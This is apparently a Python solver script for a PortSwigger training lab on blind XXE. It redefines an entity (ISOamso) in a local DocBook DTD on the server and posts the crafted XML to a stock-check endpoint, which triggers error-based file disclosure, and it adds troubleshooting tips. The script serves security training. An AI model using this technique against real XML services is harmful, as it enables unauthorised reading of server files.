"""
Lab 9: Exploiting XXE to retrieve data by repurposing a local DTD
https://portswigger.net/web-security/xxe/blind/lab-xxe-repurposing-local-dtd
Difficulty: Expert

📝 No outbound network access at all (fully blind, no OOB/exploit-server DTD
possible) — but a predictable local .dtd file exists on the server
filesystem, bundled with some library (classically one shipped with
GNOME/Yelp documentation tooling on the lab's base image). Redefine one of
ITS already-declared entities via a parameter-entity override to carry the
file-read + error-based exfil payload instead, all without leaving the box.

This technique is finicky — the exact local DTD path and which entity name
inside it is safe to redefine both depend on what's actually on the lab's
filesystem image. The path below is the one PortSwigger's own walkthrough
uses; treat the entity name as something to confirm via trial and error.
"""

from utils import get_session, log, note, build_local_dtd_repurpose_trigger

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
STOCK_CHECK_PATH = "/product/stock"

# Known-predictable DTD shipped on the lab's base image.
LOCAL_DTD_PATH = "/usr/share/yelp/dtd/docbookx.dtd"
REDEFINED_ENTITY = "ISOamso"  # one of the entities docbookx.dtd declares — safe to clobber


def run():
    s = get_session()

    xml = build_local_dtd_repurpose_trigger(LOCAL_DTD_PATH, REDEFINED_ENTITY, "")
    note(f"Payload:\n{xml}")

    r = s.post(f"{TARGET}{STOCK_CHECK_PATH}", data=xml.encode(),
                headers={"Content-Type": "application/xml"})
    log(f"Response status: {r.status_code}")
    print(r.text)

    note("If nothing comes back: confirm LOCAL_DTD_PATH exists on this lab's")
    note("image, and try a different entity name from docbookx.dtd — some")
    note("entity names in that file are reserved/already in use and will")
    note("throw a 'redefined' error instead of working silently.")


if __name__ == "__main__":
    run()
